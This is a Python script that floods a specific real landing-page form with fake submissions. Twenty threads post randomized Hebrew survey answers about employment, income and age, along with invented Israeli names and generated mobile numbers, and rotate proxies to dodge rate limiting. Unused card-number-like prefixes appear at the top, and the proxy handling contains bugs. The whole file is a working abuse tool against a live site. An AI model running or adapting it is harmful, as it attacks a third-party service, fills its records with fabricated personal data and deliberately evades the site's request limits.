import time
import requests
import random
import string
import threading

url = 'https://lp.landing-page.mobi/index.php'
num = 20

start_numbers = ['4580', '5326', '3755']
with open('data/israeli_names.csv', 'r', encoding='utf-8') as f:
    names = f.read().split()

with open('data/proxies.csv', 'r') as f:
    proxies = f.read().split()


def do_requests():
    i = 0
    k = 1
    req = 1
    proxy = proxies[i]
    while True:
        data = {
            'output': 'json',
            'page': 'landing.action',
            'id': '437899',
            'token': '59f88f6bbb5a853e0960a256d3585891',
            'force': 'mobile',
            'elementId': '11513983',
            'elementAction': 'submit',
            'field[0]': random.choice(['שכיר/ה', 'עצמאי/ת', 'בין עבודות', 'אחר']),
            'field[1]': random.choice(['כן, הייתי שכיר/ה', 'לא הייתי שכיר/ה ב-6 השנים האחרונות']),
            'field[2]': random.choice(['לא, אף אחד מאיתנו עצמאי', 'כן, אחד מאיתנו עצמאי']),
            'field[3]': random.choice(['כן', 'לא']),
            'field[4]': random.choice(['פחות מ-7,000 ש"ח', '7-10 אלף ש"ח', '10-15 אלף ש"ח', 'יותר מ-15 אלף ש"ח']),
            'field[5]': random.choice(['18-24', '25-30', '31-65', '66-70', 'מעל 70']),
            'field[6]': ' '.join(random.choices(names, k=2)),
            'field[7]': '05' + ''.join(random.choices(['2','3','4','8'], weights=(71,3,20,6), k=1)) +
                        ''.join(random.choices(string.digits, k=7))

        }
        try:
            response = requests.post(url=url, data=data, proxies={'http': 'http://' + proxy, 'https:': 'https://' + proxy}).text
            print(response[:24], 'Sending details: ', [data[j] for j in data][7:], 'request number:', k * num)
            k += 1
            if k > 15 * req:
                req += 1
                i += 1
                print('Too many requests, Moving to proxy - ', proxies[i + 1])


        except:
            print("Skipping. Connnection error")
            i += 1
            print('trying proxy - ', proxies[i + 1])


threads = []
for i in range(num):
    t = threading.Thread(target=do_requests)
    t.daemon = True
    threads.append(t)

for i in range(num):
    threads[i].start()

for i in range(num):
    threads[i].join()